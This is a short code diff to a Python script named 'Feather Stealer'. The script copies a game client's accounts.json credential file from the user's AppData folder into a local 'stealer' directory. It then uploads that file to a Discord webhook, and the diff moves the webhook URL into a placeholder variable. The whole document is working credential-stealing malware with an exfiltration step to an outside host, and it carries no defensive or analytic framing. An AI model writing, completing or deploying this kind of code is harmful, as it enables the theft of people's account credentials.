@@ -2,6 +2,8 @@ import os
 import shutil
 from discord_webhook import DiscordWebhook
 
+wh = 'your_webhook_here'
+
 def retrieve_file(source_path, destination_path):
     try:
         full_source_path = os.path.join(os.getenv('APPDATA'), source_path)
@@ -19,7 +21,7 @@ source_file_path = ".feather\\accounts.json"
 destination_file_path = "c:/stealer/accounts.json"
 retrieve_file(source_file_path, destination_file_path)
 
-webhook = DiscordWebhook(url="paste your webhook here", username="Feather Stealer")
+webhook = DiscordWebhook(url=wh, username="Feather Stealer")
 
 with open("c:/stealer/accounts.json", "rb") as f:
     webhook.add_file(file=f.read(), filename="accounts.json")
